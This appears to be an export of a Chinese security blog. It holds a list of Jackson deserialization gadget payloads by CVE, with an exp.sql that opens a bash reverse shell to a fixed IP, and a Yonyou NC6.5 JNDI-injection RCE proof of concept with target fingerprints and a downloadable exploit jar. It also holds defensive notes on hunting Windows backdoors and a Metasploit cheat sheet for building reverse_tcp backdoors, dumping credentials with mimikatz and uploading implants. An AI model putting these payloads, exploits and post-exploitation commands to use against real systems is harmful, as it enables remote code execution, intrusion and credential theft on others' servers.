<h1 id="CVE-2018-7489"><a href="#CVE-2018-7489" class="headerlink" title="CVE-2018-7489"></a>CVE-2018-7489</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&#123;&quot;jndiName&quot;:&quot;ssiipp&quot;,&quot;loginTimeout&quot;:0&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-12384"><a href="#CVE-2019-12384" class="headerlink" title="CVE-2019-12384"></a>CVE-2019-12384</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&#39;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">exp.sql</span><br><span class="line">CREATE ALIAS SHELLEXEC AS $ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command &#x3D; &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$;</span><br><span class="line">CALL SHELLEXEC(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.136.129&#x2F;7777 0&gt;&amp;1&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14379"><a href="#CVE-2019-14379" class="headerlink" title="CVE-2019-14379"></a>CVE-2019-14379</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;,&#123;&quot;properties&quot;:&#123;&quot;jndiName&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14439"><a href="#CVE-2019-14439" class="headerlink" title="CVE-2019-14439"></a>CVE-2019-14439</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14540"><a href="#CVE-2019-14540" class="headerlink" title="CVE-2019-14540"></a>CVE-2019-14540</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.zaxxer.hikari.HikariConfig&quot;, &#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14892"><a href="#CVE-2019-14892" class="headerlink" title="CVE-2019-14892"></a>CVE-2019-14892</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &#123;&quot;prefix&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;, &#123;&quot;prefix&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14893"><a href="#CVE-2019-14893" class="headerlink" title="CVE-2019-14893"></a>CVE-2019-14893</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16335"><a href="#CVE-2019-16335" class="headerlink" title="CVE-2019-16335"></a>CVE-2019-16335</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.zaxxer.hikari.HikariDataSource&quot;, &#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16942"><a href="#CVE-2019-16942" class="headerlink" title="CVE-2019-16942"></a>CVE-2019-16942</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.dbcp.datasources.SharedPoolDataSource&quot;,&#123;&quot;dataSourceName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16943"><a href="#CVE-2019-16943" class="headerlink" title="CVE-2019-16943"></a>CVE-2019-16943</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.p6spy.engine.spy.P6DataSource&quot;, &#123;&quot;realDataSource&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-17267"><a href="#CVE-2019-17267" class="headerlink" title="CVE-2019-17267"></a>CVE-2019-17267</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup&quot;,&#123;&quot;properties&quot;: &#123;&quot;jndiName&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-17531"><a href="#CVE-2019-17531" class="headerlink" title="CVE-2019-17531"></a>CVE-2019-17531</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.log4j.receivers.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-10672"><a href="#CVE-2020-10672" class="headerlink" title="CVE-2020-10672"></a>CVE-2020-10672</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-10673"><a href="#CVE-2020-10673" class="headerlink" title="CVE-2020-10673"></a>CVE-2020-10673</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.caucho.config.types.ResourceRef&quot;,&#123;&quot;lookupName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11111"><a href="#CVE-2020-11111" class="headerlink" title="CVE-2020-11111"></a>CVE-2020-11111</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.jms.pool.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.jms.pool.JcaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.pool.XaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.activemq.pool.JcaPooledConnectionFactory&quot;,&#123;&quot;tmJndiName&quot;:&quot;ssiipp&quot;, &quot;tmFromJndi&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11113"><a href="#CVE-2020-11113" class="headerlink" title="CVE-2020-11113"></a>CVE-2020-11113</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.openjpa.ee.WASRegistryManagedRuntime&quot;,&#123;&quot;registryName&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11619"><a href="#CVE-2020-11619" class="headerlink" title="CVE-2020-11619"></a>CVE-2020-11619</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.aop.config.MethodLocatingFactoryBean&quot;,&#123;&quot;targetBeanName&quot;: &quot;ssiipp&quot;,&quot;methodName&quot;:&quot;Foo&quot;,&quot;beanFactory&quot;:[&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&#123;&quot;shareableResources&quot;:[&quot;ssiipp&quot;]&#125;]&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.beans.factory.config.BeanReferenceFactoryBean&quot;,&#123;&quot;targetBeanName&quot;: &quot;ssiipp&quot;,&quot;beanFactory&quot;:[&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,&#123;&quot;shareableResources&quot;:[&quot;ssiipp&quot;]&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-11620"><a href="#CVE-2020-11620" class="headerlink" title="CVE-2020-11620"></a>CVE-2020-11620</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.jelly.impl.Embedded&quot;,&#123;&quot;script&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">spel.xml</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;whatever&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14060"><a href="#CVE-2020-14060" class="headerlink" title="CVE-2020-14060"></a>CVE-2020-14060</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oadd.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;sip&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14061"><a href="#CVE-2020-14061" class="headerlink" title="CVE-2020-14061"></a>CVE-2020-14061</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oracle.jms.AQjmsQueueConnectionFactory&quot;,&quot;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14062"><a href="#CVE-2020-14062" class="headerlink" title="CVE-2020-14062"></a>CVE-2020-14062</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-14195"><a href="#CVE-2020-14195" class="headerlink" title="CVE-2020-14195"></a>CVE-2020-14195</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.jsecurity.realm.jndi.JndiRealmFactory&quot;,&#123;&quot;jndiNames&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-8840"><a href="#CVE-2020-8840" class="headerlink" title="CVE-2020-8840"></a>CVE-2020-8840</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &#123;&quot;AsText&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9546"><a href="#CVE-2020-9546" class="headerlink" title="CVE-2020-9546"></a>CVE-2020-9546</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9547"><a href="#CVE-2020-9547" class="headerlink" title="CVE-2020-9547"></a>CVE-2020-9547</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&#123;&quot;properties&quot;: &#123;&quot;UserTransaction&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-9548"><a href="#CVE-2020-9548" class="headerlink" title="CVE-2020-9548"></a>CVE-2020-9548</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-35728"><a href="#CVE-2020-35728" class="headerlink" title="CVE-2020-35728"></a>CVE-2020-35728</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-36179-36182"><a href="#CVE-2020-36179-36182" class="headerlink" title="CVE-2020-36179 ~ 36182"></a>CVE-2020-36179 ~ 36182</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">exp.sql</span><br><span class="line">    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">    $$;</span><br><span class="line">    CALL SHELLEXEC(&#39;calc.exe&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-36184"><a href="#CVE-2020-36184" class="headerlink" title="CVE-2020-36184"></a>CVE-2020-36184</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource&quot;, &#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<p>2021-1-15</p>
]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>Jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>用友NC6.5反序列化JNDI注入远程代码执行复现</title>
    <url>/2021/01/25/%E7%94%A8%E5%8F%8BNC6-5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JNDI%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>用友NC6.5版本中存在JAVA反序列化远程命令执行漏洞。<a id="more"></a>2020年中的漏洞，虽然是老漏洞，但我感觉修的不多。</p>
<h1 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h1><p>FOFA：title=”YONYOU NC”</p>
<p>ICONHASH：1085941792</p>
<p>长得像这样，这个最近还出了一个文件上传的漏洞。</p>
<p><img src="/images/NC6.5-2.jpg" alt="NC6.5-2"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>我是个菜菜，代码分析略</p>
<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>根据<a href="https://blog.sari3l.com/posts/608d18f0/">https://blog.sari3l.com/posts/608d18f0/</a> 的poc代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import nc.bs.framework.common.NCLocator;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class poc &#123;</span><br><span class="line"></span><br><span class="line">    public static void attack(String url, String jndipath) &#123;</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        if (!url.startsWith(&quot;http&quot;)) &#123;</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line">        &#125;</span><br><span class="line">        env.put(&quot;SERVICEDISPATCH_URL&quot;, url + &quot;&#x2F;ServiceDispatcherServlet&quot;);</span><br><span class="line">        NCLocator locator &#x3D; NCLocator.getInstance(env);</span><br><span class="line">        locator.lookup(jndipath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        attack(&quot;http:&#x2F;&#x2F;target&quot;, &quot;ldap:&#x2F;&#x2F;ip:port&#x2F;classname&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>生成了一个简单jar利用工具，效果看图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar NC.jar 目标系统URL LDAP&#x2F;RMI服务地址</span><br></pre></td></tr></table></figure>
<p><img src="/images/NC6.5.jpg" alt="NC6.5"></p>
<p><img src="/images/NC6.5-1.jpg" alt="NC6.5-1"></p>
<p>工具下载地址：</p>
<p><a href="https://zxc12609.github.io/dL/NC6.5_JDNI_RCE.jar">点我下载</a></p>
]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>用友</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows后门排查</title>
    <url>/2021/02/25/Windows%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</url>
    <content><![CDATA[<p>​        <em>排查是根据攻击来做的，攻击哪些地方，那么就排查哪些地方。也是抱着学习的态度，以下排查方式大部分是从网上找的，这里精简记录一下。</em><a id="more"></a></p>
<h1 id="文件检查"><a href="#文件检查" class="headerlink" title="文件检查"></a>文件检查</h1><p>这是最基础的，攻击者要操作必须传马，用杀毒扫webshell和后门木马就完了，木马免杀的情况需要用后面的技术排查。</p>
<h1 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h1><h2 id="进程数字签名"><a href="#进程数字签名" class="headerlink" title="进程数字签名"></a>进程数字签名</h2><p>PCHunter直接右键</p>
<p><img src="/images/pc-1.jpg" alt="pc-1"></p>
<h2 id="进程模块的数字签名"><a href="#进程模块的数字签名" class="headerlink" title="进程模块的数字签名"></a>进程模块的数字签名</h2><p>PCHunter查看模块直接右键</p>
<p><img src="/images/PC-2.jpg" alt="PC-2"></p>
<h2 id="网络进程"><a href="#网络进程" class="headerlink" title="网络进程"></a>网络进程</h2><p>这个很多工具可以看，命令也可以看</p>
<p><img src="/images/pc-3.jpg" alt="pc-3"></p>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>用ProcessExplorer看进行、命令、dll、句柄。</p>
<p><img src="/images/pc-4.jpg" alt="pc-4"></p>
<h2 id="进程内存注入"><a href="#进程内存注入" class="headerlink" title="进程内存注入"></a>进程内存注入</h2><p>用ProcessExplorer右键属性看。对比映像和内存的字符串，用diff工具对比不同之处，区别较大的、新增了奇怪的文件的，可能内存被注入。</p>
<p><img src="/images/pc-5.jpg" alt="pc-5"></p>
<h2 id="进程文件"><a href="#进程文件" class="headerlink" title="进程文件"></a>进程文件</h2><p>processhacker右键看属性</p>
<p><img src="/images/pc-6.jpg" alt="pc-6"></p>
<h2 id="驱动数字签名"><a href="#驱动数字签名" class="headerlink" title="驱动数字签名"></a>驱动数字签名</h2><p><img src="/images/pc-7.jpg" alt="pc-7"></p>
<h1 id="启动项检查"><a href="#启动项检查" class="headerlink" title="启动项检查"></a>启动项检查</h1><p>用Autoruns看</p>
<p><img src="/images/pc-8.jpg" alt="pc-8"></p>
<h1 id="内存排查"><a href="#内存排查" class="headerlink" title="内存排查"></a>内存排查</h1><p>排查进程中可疑的内存模块，找出可能是Shellcode的模块代码。</p>
<p>通过processhacker-【Momory】模块，找到【Type】为Private，权限为【RWX】，大小为180~300KB的模块。查到以下内容就导出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- - 1、权限是RWX权限的。</span><br><span class="line">- - 2、文件块大小在170~300内</span><br><span class="line">- - 3、代码头是以下3种字符</span><br><span class="line">           E8 DC C4 03</span><br><span class="line">           4D 5A</span><br><span class="line">           55 8B EC 8B 45</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>windows应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit命令整理</title>
    <url>/2021/03/23/metasploit%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p><em>整理一下笔记，整理的过程对加强记忆很有帮助，不是抄的。</em><a id="more"></a>*</p>
<h2 id="列出payload"><a href="#列出payload" class="headerlink" title="列出payload"></a>列出payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom --list payloads | awk &#39;&#123;print $1&#125;&#39;</span><br></pre></td></tr></table></figure>
<h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.17.131 lport&#x3D;6666 -f exe -o backdoor.exe </span><br></pre></td></tr></table></figure>
<p>以上的方式不太方便，以下方式更方便</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在msf命令行下use payload</span><br><span class="line">generate -f raw -o 1.bin</span><br></pre></td></tr></table></figure>
<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p>以下文件保存为x.rb，使用-r参数加载文件。</p>
<p>所有命令都可以写成这么个文件进行自动加载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.17.131</span><br><span class="line">set LPORT 6666</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set SessionCommunicationTimeout 0</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>加载文件的监听方式确实比自己手动敲命令快，但更快的是下面的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">handler -H 10.211.55.2 -P 3333 -p windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
<h3 id="持续监听"><a href="#持续监听" class="headerlink" title="持续监听"></a>持续监听</h3><p>可以在接收到seesion后继续监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set ExitOnSession false   </span><br></pre></td></tr></table></figure>
<h3 id="防止session超时退出"><a href="#防止session超时退出" class="headerlink" title="防止session超时退出"></a>防止session超时退出</h3><p>默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set SessionCommunicationTimeout 0  </span><br></pre></td></tr></table></figure>
<h3 id="防止session强制关闭"><a href="#防止session强制关闭" class="headerlink" title="防止session强制关闭"></a>防止session强制关闭</h3><p>默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set SessionExpirationTimeout 0 </span><br></pre></td></tr></table></figure>
<h2 id="meterpreter的各种命令"><a href="#meterpreter的各种命令" class="headerlink" title="meterpreter的各种命令"></a>meterpreter的各种命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat c:\boot.ini	#查看文件内容,文件必须存在</span><br><span class="line">del c:\boot.ini #删除指定的文件</span><br><span class="line">download nimeia.txt &#x2F;root&#x2F;Desktop&#x2F;   #下载文件到本机上</span><br><span class="line">edit c:\boot.ini  # 编辑文件</span><br><span class="line">getlwd	#打印本地目录</span><br><span class="line">getwd	#打印工作目录</span><br><span class="line">lcd	#更改本地目录</span><br><span class="line">ls	#列出在当前目录中的文件列表</span><br><span class="line">lpwd	#打印本地目录</span><br><span class="line">pwd	#输出工作目录</span><br><span class="line">cd c:\\ 	#进入目录文件下</span><br><span class="line">rm file 	#删除文件</span><br><span class="line">mkdir dier 	#在受害者系统上的创建目录</span><br><span class="line">rmdir	#受害者系统上删除目录</span><br><span class="line">dir	#列出目标主机的文件和文件夹信息</span><br><span class="line">mv	#修改目标主机上的文件名</span><br><span class="line">upload &#x2F;root&#x2F;backdoor.exe c:\\users\\arche\\AppData\\local\\backdoor.exe	#上传文件</span><br><span class="line">search -d d:\\www -f web.config 	#search 文件，如search  -d c:\\  -f*.doc</span><br><span class="line">search -f autoexec.bat  #搜索文件</span><br><span class="line">search -f sea*.bat c:\\xamp\\</span><br></pre></td></tr></table></figure>
<h3 id="模块加载"><a href="#模块加载" class="headerlink" title="模块加载"></a>模块加载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load mimakatz		#不用多说  help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line">load powershell     #执行powershell命令</span><br><span class="line">load espia 			#截图的</span><br><span class="line">load extapi			#额外模块，一般用不到</span><br><span class="line">load lanattacks		#内网攻击模块</span><br></pre></td></tr></table></figure>
<h3 id="命令执行、通道、令牌"><a href="#命令执行、通道、令牌" class="headerlink" title="命令执行、通道、令牌"></a>命令执行、通道、令牌</h3><p>关于命令执行，可使用进入交互式shell执行命令，可以加载powershell模块执行命令，还可以使用execute后台执行，将命令放入channel。这里主要记录一下execute，在提权时可能有用。</p>
